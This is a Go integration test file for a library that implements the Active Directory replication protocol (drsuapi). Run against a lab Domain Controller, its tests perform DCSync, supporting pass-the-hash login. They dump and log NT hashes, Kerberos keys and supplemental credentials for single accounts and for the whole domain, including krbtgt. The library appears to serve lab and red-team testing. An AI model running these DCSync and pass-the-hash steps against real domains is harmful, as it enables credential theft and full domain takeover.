//go:build integration

package msdrsr_test

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"os"
	"strconv"
	"testing"
	"time"

	msdrsr "github.com/TheManticoreProject/Manticore/network/dcerpc/ms-protocols/ms-drsr"
	kerbcrypto "github.com/TheManticoreProject/Manticore/network/kerberos/v5/crypto"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/iana"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
	drsrtypes "github.com/TheManticoreProject/Manticore/windows/protocols/ms-drsr"
)

// TestDRSBindUnbind exercises the full Phase 2 path against a live Domain Controller:
// endpoint-mapper resolution, ncacn_ip_tcp dial, NTLM packet-privacy auth, drsuapi bind,
// and the IDL_DRSBind / IDL_DRSUnbind handshake. It is skipped unless DRSUAPI_TEST_HOST
// is set.
//
//	DRSUAPI_TEST_HOST=10.0.0.10 DRSUAPI_TEST_DOMAIN=lab.local \
//	DRSUAPI_TEST_USER=Administrator DRSUAPI_TEST_PASS=... \
//	go test -tags integration ./network/dcerpc/ms-protocols/ms-drsr/
//
// Pass-the-hash: set DRSUAPI_TEST_HASHES=LM:NT (or :NT) instead of DRSUAPI_TEST_PASS.
// Skip endpoint-mapper resolution with DRSUAPI_TEST_PORT.
func TestDRSBindUnbind(t *testing.T) {
	host := os.Getenv("DRSUAPI_TEST_HOST")
	if host == "" {
		t.Skip("set DRSUAPI_TEST_HOST to run the drsuapi bind integration test")
	}
	creds, err := credentials.NewCredentials(
		os.Getenv("DRSUAPI_TEST_DOMAIN"),
		os.Getenv("DRSUAPI_TEST_USER"),
		os.Getenv("DRSUAPI_TEST_PASS"),
		os.Getenv("DRSUAPI_TEST_HASHES"),
	)
	if err != nil {
		t.Fatalf("build credentials: %v", err)
	}

	c := msdrsr.New(host, creds)
	c.SetTimeout(15 * time.Second)
	if p := os.Getenv("DRSUAPI_TEST_PORT"); p != "" {
		n, err := strconv.Atoi(p)
		if err != nil {
			t.Fatalf("invalid DRSUAPI_TEST_PORT %q: %v", p, err)
		}
		c.SetPort(n)
	}

	if err := c.Connect(); err != nil {
		t.Fatalf("Connect: %v", err)
	}
	defer c.Close()

	if c.Handle().IsNull() {
		t.Error("IDL_DRSBind returned a null context handle")
	}
	if len(c.SessionKey()) == 0 {
		t.Error("no NTLM session key after authenticated bind")
	}
	ext := c.ServerExtensions()
	if ext == nil {
		t.Fatal("server returned no DRS_EXTENSIONS")
	}
	t.Logf("server extensions: dwFlags=0x%08x dwFlagsExt=0x%08x dwReplEpoch=%d",
		ext.DwFlags, ext.DwFlagsExt, ext.DwReplEpoch)
	if ext.DwFlags&drsrtypes.DRS_EXT_STRONG_ENCRYPTION == 0 {
		t.Error("server did not negotiate STRONG_ENCRYPTION; secret replication would be refused")
	}
}

// TestCrackAndReplicate exercises the DCSync critical thread against a live DC: resolve a
// target account to its objectGUID with IDL_DRSCrackNames, then replicate that single
// object with IDL_DRSGetNCChanges (EXOP_REPL_OBJ) and decrypt its secrets. Requires
// DRSUAPI_TEST_HOST and a target: DRSUAPI_TEST_DN (a distinguished name, e.g.
// "CN=Administrator,CN=Users,DC=lab,DC=local"; recommended — no NetBIOS name needed) or
// DRSUAPI_TEST_TARGET (an NT4-format "DOMAIN\\user").
func TestCrackAndReplicate(t *testing.T) {
	host := os.Getenv("DRSUAPI_TEST_HOST")
	dn := os.Getenv("DRSUAPI_TEST_DN")
	target := os.Getenv("DRSUAPI_TEST_TARGET")
	if host == "" || (dn == "" && target == "") {
		t.Skip("set DRSUAPI_TEST_HOST and DRSUAPI_TEST_DN (or DRSUAPI_TEST_TARGET) to run")
	}
	creds, err := credentials.NewCredentials(
		os.Getenv("DRSUAPI_TEST_DOMAIN"), os.Getenv("DRSUAPI_TEST_USER"),
		os.Getenv("DRSUAPI_TEST_PASS"), os.Getenv("DRSUAPI_TEST_HASHES"),
	)
	if err != nil {
		t.Fatalf("build credentials: %v", err)
	}

	c := msdrsr.New(host, creds)
	c.SetTimeout(15 * time.Second)
	if err := c.Connect(); err != nil {
		t.Fatalf("Connect: %v", err)
	}
	defer c.Close()

	name, format := dn, drsrtypes.DS_FQDN_1779_NAME
	if name == "" {
		name, format = target, drsrtypes.DS_NT4_ACCOUNT_NAME
	}
	objGUID, err := c.ResolveToGUID(name, format)
	if err != nil {
		t.Fatalf("ResolveToGUID(%q): %v", name, err)
	}
	t.Logf("%s -> %s", name, objGUID.ToFormatD())

	res, err := c.ReplicateSingleObject(objGUID)
	if err != nil {
		t.Fatalf("ReplicateSingleObject: %v", err)
	}
	if len(res.Objects) == 0 {
		t.Fatal("no objects returned")
	}
	obj := res.Objects[0]
	t.Logf("replicated %s (%s) with %d attributes", obj.DN, obj.GUID.ToFormatD(), len(obj.Attributes))
	if len(obj.Attributes) == 0 {
		t.Error("object returned with no attributes")
	}

	secrets, err := c.DecryptSecrets(res)
	if err != nil {
		t.Fatalf("DecryptSecrets: %v", err)
	}
	if len(secrets) == 0 {
		t.Fatal("no secrets decrypted (object had no objectSid?)")
	}
	s := secrets[0]
	if !s.HasNT {
		t.Error("no NT hash decrypted for the target account")
	}
	// secretsdump-style line: sAMAccountName:RID:LMHash:NTHash:::
	t.Logf("%s:%d:%x:%x:::", s.SAMAccountName, s.RID, s.LMHash, s.NTHash)
}

// TestSupplementalCredentials live-validates supplemental credential parsing and,
// when DRSUAPI_TEST_VERIFY_PASSWORD is set to the target account's password, checks the
// extracted current AES256 key with the RFC 3962 string-to-key implementation.
func TestSupplementalCredentials(t *testing.T) {
	host := os.Getenv("DRSUAPI_TEST_HOST")
	dn := os.Getenv("DRSUAPI_TEST_DN")
	if host == "" || dn == "" {
		t.Skip("set DRSUAPI_TEST_HOST and DRSUAPI_TEST_DN to run")
	}
	creds, err := credentials.NewCredentials(
		os.Getenv("DRSUAPI_TEST_DOMAIN"), os.Getenv("DRSUAPI_TEST_USER"),
		os.Getenv("DRSUAPI_TEST_PASS"), os.Getenv("DRSUAPI_TEST_HASHES"),
	)
	if err != nil {
		t.Fatalf("build credentials: %v", err)
	}
	c := msdrsr.New(host, creds)
	c.SetTimeout(15 * time.Second)
	if err := c.Connect(); err != nil {
		t.Fatalf("Connect: %v", err)
	}
	defer c.Close()

	account, err := c.DCSyncByDN(dn)
	if err != nil {
		t.Fatalf("DCSyncByDN(%q): %v", dn, err)
	}
	if len(account.SupplementalCredentials) == 0 {
		t.Fatal("target has no supplementalCredentials")
	}
	if len(account.KerberosKeys) == 0 {
		t.Fatal("target has no parsed Kerberos keys")
	}
	t.Logf("parsed %d Kerberos keys, %d WDigest hashes, cleartext=%v", len(account.KerberosKeys), len(account.WDigestHashes), len(account.CleartextPasswordRaw) != 0)

	password := os.Getenv("DRSUAPI_TEST_VERIFY_PASSWORD")
	if password == "" {
		return
	}
	for _, key := range account.KerberosKeys {
		if key.KeyType != iana.ETypeAES256CTSHMACSHA196 || key.Category != msdrsr.KerberosKeyCurrent {
			continue
		}
		var params [4]byte
		binary.BigEndian.PutUint32(params[:], key.IterationCount)
		derived, err := kerbcrypto.StringToKey(int(key.KeyType), password, key.Salt, params[:])
		if err != nil {
			t.Fatalf("derive AES256 key: %v", err)
		}
		if !bytes.Equal(derived, key.Value) {
			t.Fatalf("extracted AES256 key does not match RFC 3962 derivation")
		}
		t.Logf("validated current AES256 key with salt %q and %d iterations", key.Salt, key.IterationCount)
		return
	}
	t.Fatal("target has no current AES256 key")
}

// TestDomainControllerInfoAndDCSync exercises the Phase 5 workflow: IDL_DRSDomainController
// Info to enumerate DCs (and obtain the source DSA GUID), then the one-call DCSync helper.
// Requires DRSUAPI_TEST_HOST, DRSUAPI_TEST_DNSDOMAIN (e.g. "lab.local"), and a target via
// DRSUAPI_TEST_DN (recommended) or DRSUAPI_TEST_TARGET.
func TestDomainControllerInfoAndDCSync(t *testing.T) {
	host := os.Getenv("DRSUAPI_TEST_HOST")
	dnsDomain := os.Getenv("DRSUAPI_TEST_DNSDOMAIN")
	dn := os.Getenv("DRSUAPI_TEST_DN")
	if host == "" || dnsDomain == "" || dn == "" {
		t.Skip("set DRSUAPI_TEST_HOST, DRSUAPI_TEST_DNSDOMAIN and DRSUAPI_TEST_DN to run")
	}
	creds, err := credentials.NewCredentials(
		os.Getenv("DRSUAPI_TEST_DOMAIN"), os.Getenv("DRSUAPI_TEST_USER"),
		os.Getenv("DRSUAPI_TEST_PASS"), os.Getenv("DRSUAPI_TEST_HASHES"))
	if err != nil {
		t.Fatalf("build credentials: %v", err)
	}

	c := msdrsr.New(host, creds)
	c.SetTimeout(15 * time.Second)
	if err := c.Connect(); err != nil {
		t.Fatalf("Connect: %v", err)
	}
	defer c.Close()

	dcs, err := c.DomainControllerInfo(dnsDomain)
	if err != nil {
		t.Fatalf("DomainControllerInfo: %v", err)
	}
	if len(dcs) == 0 {
		t.Fatal("no DCs returned")
	}
	for _, dc := range dcs {
		t.Logf("DC %s (%s) site=%s ntdsDsaGuid=%s pdc=%v gc=%v",
			dc.NetbiosName, dc.DNSHostName, dc.SiteName, dc.NtdsDsaObjectGuid.ToFormatD(), dc.IsPDC, dc.IsGC)
	}
	// Use the first DC's DSA GUID as the replication source (robustness path).
	c.SetSourceDSA(dcs[0].NtdsDsaObjectGuid)

	sec, err := c.DCSyncByDN(dn)
	if err != nil {
		t.Fatalf("DCSyncByDN: %v", err)
	}
	if !sec.HasNT {
		t.Error("DCSync returned no NT hash")
	}
	t.Logf("%s:%d:%x:%x:::", sec.SAMAccountName, sec.RID, sec.LMHash, sec.NTHash)
}

// TestReplInfoRecon exercises the read-only recon wrappers: replication cursors for the
// NC and site-cost queries. Requires DRSUAPI_TEST_HOST and DRSUAPI_TEST_NC (the NC DN,
// e.g. "DC=lab,DC=local"); DRSUAPI_TEST_SITE optionally names a site for the cost query.
func TestReplInfoRecon(t *testing.T) {
	host := os.Getenv("DRSUAPI_TEST_HOST")
	nc := os.Getenv("DRSUAPI_TEST_NC")
	if host == "" || nc == "" {
		t.Skip("set DRSUAPI_TEST_HOST and DRSUAPI_TEST_NC to run")
	}
	creds, err := credentials.NewCredentials(
		os.Getenv("DRSUAPI_TEST_DOMAIN"), os.Getenv("DRSUAPI_TEST_USER"),
		os.Getenv("DRSUAPI_TEST_PASS"), os.Getenv("DRSUAPI_TEST_HASHES"))
	if err != nil {
		t.Fatalf("build credentials: %v", err)
	}
	c := msdrsr.New(host, creds)
	c.SetTimeout(15 * time.Second)
	if err := c.Connect(); err != nil {
		t.Fatalf("Connect: %v", err)
	}
	defer c.Close()

	cursors, err := c.ReplicationCursors(nc)
	if err != nil {
		t.Fatalf("ReplicationCursors: %v", err)
	}
	t.Logf("%d replication cursor(s) for %s", len(cursors), nc)
	for _, cur := range cursors {
		t.Logf("  invocationID=%s upToDateUSN=%d", cur.SourceDSAInvocationID.ToFormatD(), cur.UpToDateUSN)
	}

	if site := os.Getenv("DRSUAPI_TEST_SITE"); site != "" {
		costs, err := c.QuerySitesByCost(site, []string{site})
		if err != nil {
			t.Fatalf("QuerySitesByCost: %v", err)
		}
		for _, sc := range costs {
			t.Logf("site %s -> %s: err=%d cost=%d", site, sc.ToSite, sc.ErrorCode, sc.Cost)
		}
	}
}

// TestDCSyncAll exercises full-NC replication: page IDL_DRSGetNCChanges over the whole NC
// and decrypt every security principal. Requires DRSUAPI_TEST_HOST and DRSUAPI_TEST_NC
// (the NC DN, e.g. "DC=lab,DC=local").
func TestDCSyncAll(t *testing.T) {
	host := os.Getenv("DRSUAPI_TEST_HOST")
	nc := os.Getenv("DRSUAPI_TEST_NC")
	if host == "" || nc == "" {
		t.Skip("set DRSUAPI_TEST_HOST and DRSUAPI_TEST_NC to run")
	}
	creds, err := credentials.NewCredentials(
		os.Getenv("DRSUAPI_TEST_DOMAIN"), os.Getenv("DRSUAPI_TEST_USER"),
		os.Getenv("DRSUAPI_TEST_PASS"), os.Getenv("DRSUAPI_TEST_HASHES"))
	if err != nil {
		t.Fatalf("build credentials: %v", err)
	}
	c := msdrsr.New(host, creds)
	c.SetTimeout(30 * time.Second)
	if err := c.Connect(); err != nil {
		t.Fatalf("Connect: %v", err)
	}
	defer c.Close()

	secrets, err := c.DCSyncAll(nc)
	if err != nil {
		t.Fatalf("DCSyncAll: %v", err)
	}
	t.Logf("DCSyncAll(%s): %d security principal(s)", nc, len(secrets))
	if len(secrets) == 0 {
		t.Fatal("no principals returned")
	}
	var sawAdmin, sawKrbtgt bool
	for _, s := range secrets {
		t.Logf("%s:%d:%x:%x:::", s.SAMAccountName, s.RID, s.LMHash, s.NTHash)
		switch s.RID {
		case 500:
			sawAdmin = true
		case 502:
			sawKrbtgt = true
		}
	}
	if !sawAdmin {
		t.Error("Administrator (RID 500) not present in full-NC dump")
	}
	if !sawKrbtgt {
		t.Error("krbtgt (RID 502) not present in full-NC dump")
	}
}

// TestReadOpnums exercises the read-only opnum wrappers against a live DC:
// IDL_DRSGetReplInfo info types, IDL_DRSVerifyNames, IDL_DRSGetMemberships. Requires
// DRSUAPI_TEST_HOST and DRSUAPI_TEST_NC; DRSUAPI_TEST_DN names an object to verify/expand.
func TestReadOpnums(t *testing.T) {
	host := os.Getenv("DRSUAPI_TEST_HOST")
	nc := os.Getenv("DRSUAPI_TEST_NC")
	if host == "" || nc == "" {
		t.Skip("set DRSUAPI_TEST_HOST and DRSUAPI_TEST_NC to run")
	}
	creds, err := credentials.NewCredentials(
		os.Getenv("DRSUAPI_TEST_DOMAIN"), os.Getenv("DRSUAPI_TEST_USER"),
		os.Getenv("DRSUAPI_TEST_PASS"), os.Getenv("DRSUAPI_TEST_HASHES"))
	if err != nil {
		t.Fatalf("build credentials: %v", err)
	}
	c := msdrsr.New(host, creds)
	c.SetTimeout(20 * time.Second)
	if err := c.Connect(); err != nil {
		t.Fatalf("Connect: %v", err)
	}
	defer c.Close()

	nb, err := c.ReplicationNeighbors(nc)
	if err != nil {
		t.Fatalf("ReplicationNeighbors: %v", err)
	}
	t.Logf("neighbors: %d", len(nb))
	for _, n := range nb {
		t.Logf("  src=%s addr=%s lastResult=%d", n.SourceDsaDN, n.SourceDsaAddress, n.LastSyncResult)
	}
	if ops, err := c.ReplicationPendingOps(); err != nil {
		t.Fatalf("ReplicationPendingOps: %v", err)
	} else {
		t.Logf("pending ops: %d", len(ops))
	}
	if f, err := c.ReplicationConnectFailures(); err != nil {
		t.Fatalf("ReplicationConnectFailures: %v", err)
	} else {
		t.Logf("connect failures: %d", len(f))
	}
	if f, err := c.ReplicationLinkFailures(); err != nil {
		t.Fatalf("ReplicationLinkFailures: %v", err)
	} else {
		t.Logf("link failures: %d", len(f))
	}

	dn := os.Getenv("DRSUAPI_TEST_DN")
	if dn == "" {
		return
	}
	vn, err := c.VerifyNames([]string{dn, "CN=NoSuchObject," + nc})
	if err != nil {
		t.Fatalf("VerifyNames: %v", err)
	}
	for _, v := range vn {
		t.Logf("verify %q -> found=%v dn=%q guid=%s", v.Input, v.Found, v.DN, v.GUID.ToFormatD())
	}
	if len(vn) > 0 && !vn[0].Found {
		t.Errorf("expected %q to verify", dn)
	}

}

// TestReadOpnums2 exercises the remaining read-only opnum wrappers: ReadNgcKey,
// GetNT4ChangeLog, GetObjectExistence, GetMemberships(2). Requires DRSUAPI_TEST_HOST,
// DRSUAPI_TEST_NC; DRSUAPI_TEST_ACCOUNT names an account for ReadNgcKey.
func TestReadOpnums2(t *testing.T) {
	host := os.Getenv("DRSUAPI_TEST_HOST")
	nc := os.Getenv("DRSUAPI_TEST_NC")
	if host == "" || nc == "" {
		t.Skip("set DRSUAPI_TEST_HOST and DRSUAPI_TEST_NC to run")
	}
	creds, err := credentials.NewCredentials(
		os.Getenv("DRSUAPI_TEST_DOMAIN"), os.Getenv("DRSUAPI_TEST_USER"),
		os.Getenv("DRSUAPI_TEST_PASS"), os.Getenv("DRSUAPI_TEST_HASHES"))
	if err != nil {
		t.Fatalf("build credentials: %v", err)
	}
	c := msdrsr.New(host, creds)
	c.SetTimeout(20 * time.Second)
	if err := c.Connect(); err != nil {
		t.Fatalf("Connect: %v", err)
	}
	defer c.Close()

	acct := os.Getenv("DRSUAPI_TEST_ACCOUNT")
	if acct == "" {
		acct = "CN=Administrator,CN=Users," + nc
	}
	if key, rv, err := c.ReadNgcKey(acct); err != nil {
		t.Fatalf("ReadNgcKey: %v", err)
	} else {
		t.Logf("ReadNgcKey(%s): retVal=0x%x keyLen=%d (0x200a = account has no NGC key)", acct, rv, len(key))
	}

	if cl, err := c.GetNT4ChangeLog(nil, 0x10000); err != nil {
		t.Logf("GetNT4ChangeLog: %v (acceptable: modern DCs may not serve NT4 changelog)", err)
	} else {
		t.Logf("GetNT4ChangeLog: ntstatus=0x%x logLen=%d restartLen=%d", cl.ActualNTStatus, len(cl.Log), len(cl.Restart))
	}

	adminSID, _ := hex.DecodeString("010500000000000515000000fdca06a7cba8d22c3eae86ecf4010000")
	if groups, err := c.GetMemberships([][]byte{adminSID}, drsrtypes.RevMembGetGroupsForUser, nc); err != nil {
		t.Fatalf("GetMemberships: %v", err)
	} else {
		t.Logf("GetMemberships: %d group(s)", len(groups))
	}
	if groups, err := c.GetMemberships2([][][]byte{{adminSID}}, drsrtypes.RevMembGetGroupsForUser, nc); err != nil {
		t.Fatalf("GetMemberships2: %v", err)
	} else {
		t.Logf("GetMemberships2: %d group(s)", len(groups))
	}
}
